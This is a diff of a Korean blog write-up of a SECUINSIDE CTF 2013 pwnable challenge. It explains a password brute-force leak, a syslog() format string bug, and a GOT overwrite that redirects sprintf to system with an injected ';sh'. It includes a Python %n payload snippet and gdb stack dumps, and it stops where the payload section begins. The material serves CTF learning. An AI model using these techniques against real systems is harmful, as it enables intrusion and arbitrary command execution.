@@ -4,7 +4,7 @@ date = "2024-07-19"
 description = "SECUINSIDE CTF 2013 pwnable challenge"
 
 [taxonomies]
-tags = ["ctf", "pwnable", "fsb"]
+tags = ["ctf", "pwnable", "info leak", "fsb", "syslog"]
 +++
 
 ## 0x00. Introduction
@@ -17,8 +17,9 @@ tags = ["ctf", "pwnable", "fsb"]
     PIE:      No PIE (0x8048000)
 ```
 
+
 ## 0x01. Vulnerability
-### Leak password
+### Info Leak
 ``` c
 int main()
 {
@@ -34,7 +35,9 @@ int main()
   return -1;
 }
 ```
+
 `main()`의 핵심적인 `lock()`, `unlock()` 기능을 사용하기 위해서는 `floor_804A4C0`, `room_804A0A0` 값을 범위에 맞게 입력하고, `read_password_8048A7D()`의 결과가 `True`여야 한다.
+
 ``` c
 int read_password_8048A7D()
 {
@@ -56,10 +59,12 @@ int read_password_8048A7D()
   return memcmp(password, buf, 16u);
 }
 ```
+
 `read_password_8048A7D()`를 보면 `read()`에서 40바이트를 읽으며 지역변수 `password`의 값을 조작할 수 있지만, `lock()`이나 `unlock()`에서는 전역변수 `password_804A0A4`의 값과 비교하기 때문에 의미가 없다.
 
-대신 다른 공격이 가능한데, `password`의 마지막 1바이트를 남겨놓고 `buf`와 같은 값으로 덮으면 1바이트씩 brute forcing이 가능하다.
-### FSB in syslog
+대신 다른 공격이 가능한데, `password`의 마지막 1바이트를 남겨놓고 앞 부분은 `buf`와 같은 값으로 덮으면 1바이트씩 brute forcing이 가능하다.
+
+### FSB in `syslog`
 ``` c
 int lock_8048877()
 {
@@ -76,39 +81,44 @@ int lock_8048877()
   return 0;
 }
 ```
+
 `password` leak에 성공하면 `lock()`과 `unlock()`의 기능을 사용할 수 있다.
 
 이 중에서 `syslog()`에 대해서 자세하게 살펴보면,
+
 ``` c
 void syslog(int priority, const char *format, ...);
 ```
+
 두 번째 인자 `format`은 format string으로, [Linux manual page](https://man7.org/linux/man-pages/man3/syslog.3.html)에서도 관련 내용을 확인할 수 있다.
 
 > Never pass a string with user-supplied data as a format, use the following instead:
-> 
-> syslog(priority, "%s", string);
+> `syslog(priority, "%s", string);`
 
 그런데 `lock()`에서는 `syslog(13, fmt_0804A0C0);` 형식으로 사용하고 있기 때문에 `fmt_0804A0C0`에 format string을 넣어주면 FSB가 발생한다.
 
 다행히 `name_804A2C0`를 통해 `fmt_0804A0C0`에 format string을 전달할 수 있으므로, 취약점을 활용할 수 있다.
 
-## 0x02. Exploit
-평소처럼 FSB를 활용하려면 payload를 `%p %p %p %p ...` 이런 식으로 구성해서 몇 번째 format string부터 `$esp`가 가리키는 부분인지 확인했을텐데, `syslog()`는 `/var/log/syslog`에 로그를 남길 뿐이라서 결과를 확인할 수가 없었다.
 
-결국 `%?$n`에서 `?`값을 늘려가며 언제 어디에 값이 써지는지 매뉴얼 확인을 했다.
+## 0x02. Exploit
+평소처럼 FSB를 활용하려면 payload를 `%p %p %p %p ...` 이런 식으로 구성해서 몇 번째 format string부터 `$esp`가 가리키는 부분인지 확인한다.
+하지만 `syslog()`는 `/var/log/syslog`에 로그를 남길 뿐이라서 결과를 확인할 수가 없었다.
+결국 `%?$n`에서 `?`값을 늘려가며 언제 어디에 값이 써지는지 손으로 퍼징을 했다.
 
 그 결과 `$esp`에서 n번째 메모리는 `%(n + 2)$n`으로 접근할 수있다는 것을 확인했다.
 
-또한 우리가 입력한 format string만 출력되는 것이 아니라 `"LOCK %d-%d by %s"` 문자열의 `%s` 부분에 format string이 들어가므로 12바이트만큼 값이 더 써진다.
-
+또한 우리가 입력한 format string만 출력되는 것이 아니라 `"LOCK %d-%d by %s"` 문자열의 `%s` 부분에 format string이 들어가므로 `0xc`바이트만큼 값이 더 써진다.
 따라서 다음과 같이 payload를 작성했다.
+
 ``` python
     # %n$ -> pointing (n + 2)th dword from esp
     value = elf.got['sprintf']
     index = 26
     lock(s, key, f"%{value - 0xc}c%{index - 2}$n".encode())
 ```
+
 이제 exploit을 위해 `syslog()`를 호출할 때의 stack을 보면 다음과 같다.
+
 ``` bash
 gef➤  x/20wx $esp
 0xffffdcc0:     0x0000000d      0x0804a0c0      0x00000001      0x00000002
@@ -141,38 +151,41 @@ gef➤  x/20wx $esp + 0x140
 0xffffde30:     0x00000005      0x00000009      0x00000007      0xf7fdc000
 0xffffde40:     0x00000008      0x00000000      0x00000009      0x08048670
 ```
-모든 입력을 전역변수에 받기 때문에 stack에 있는 값을 잘 이용해서 exploit을 해야한다.
 
+모든 입력을 전역변수에 받기 때문에 stack에 있는 값을 잘 이용해서 exploit을 해야한다.
 처음에는 4바이트가 한번에 써질거라고 생각을 못해서
+
 ``` bash
 gef➤  x/wx $esp + 0x64
 0xffffdd24:     0xffffddb4
 gef➤  x/wx 0xffffddb4
 0xffffddb4:     0xffffdec4
 ```
+
 1. `0xffffddb4`에 `0x00` write
-  - 0xffffddb4:     0xffffde00
+  - `0xffffddb4:     0xffffde00`
 2. `0xffffde00`에 2바이트 write (하위 2바이트)
-  - 0xffffde00:     0x0000a03c
+  - `0xffffde00:     0x0000a03c`
 3. `0xffffddb4`에 `0x02` write
-  - 0xffffddb4:     0xffffde02
+  - `0xffffddb4:     0xffffde02`
 4. `0xffffde00`에 2바이트 write (상위 2바이트)
-  - 0xffffde00:     0x0804a03c
+  - `0xffffde00:     0x0804a03c`
 5. `0x0804a03c`(sprintf got)에 2바이트 write
 
 이런 식으로 exploit을 진행하려고 했으나, ASLR을 키고 나니까 상황이 달라졌다.
+
 ``` bash
 gef➤  x/wx $esp+0x64
 0xff8ca684:     0xff8ca714
 gef➤  x/wx 0xff8ca714
 0xff8ca714:     0xff8caec4
 ```
+
 ASLR이 꺼진 경우 `0xffffddb4`가 `0xffffdec4`를 가리키고 있어 `0xffffde??` 영역을  컨트롤할 수 있는 반면
 
 ASLR이 켜진 경우 `0xff8ca714`가 `0xff8caec4`를 가리키고 있어 `0xff8cae??` 영역을 컨트롤할 수 있다.
 
 이러면 `sprintf()`의 got 주소를 stack에 잘 구성해놓고 정작 `%?$n`으로 접근할 때 `?` 값이 일정하지 않다는 문제가 발생한다.
-
 그렇게 확률 이슈로 한참 고생을 하다가 알게 된 사실이 `0x0804a03c`가 한 번에 쓰여진다는 것인데, 그러면 exploit이 상당히 간결해진다.
 
 1. `0xffffddb4`에 `0x0804a03c`(sprintf got) write
@@ -188,14 +201,17 @@ ASLR이 켜진 경우 `0xff8ca714`가 `0xff8caec4`를 가리키고 있어 `0xff8
     return -1;
   sprintf(fmt_0804A0C0, "./lock UNLOCK %d %d", floor_804A4C0, room_804A0A0);
 ```
-첫 번째 인자인 `fmt_0804A0C0`에 `password`가 담겨있어야 하는데, 다행히 `memcmp()`를 16바이트만 하는 반면 입력은 20바이트를 받으므로 4바이트의 여유 공간이 생긴다.
 
+첫 번째 인자인 `fmt_0804A0C0`에 `password`가 담겨있어야 하는데, 다행히 `memcmp()`를 16바이트만 하는 반면 입력은 20바이트를 받으므로 4바이트의 여유 공간이 생긴다.
 따라서 key 뒤에 `;sh`를 넣어주면 got overwrite가 성공했을 때 다음과 같이 함수가 실행된다.
+
 ``` c
   // sprintf(fmt_0804A0C0, "./lock UNLOCK %d %d", floor_804A4C0, room_804A0A0);
   system("c39f30e348c07297;sh");
 ```
+
 앞의 `c39f30e348c07297` 부분은 없는 명령이므로 무시되고, 다음 명령인 `sh`가 실행되어 shell을 실행시킬 수 있다.
+
 
 ## 0x03. Payload
 ``` python
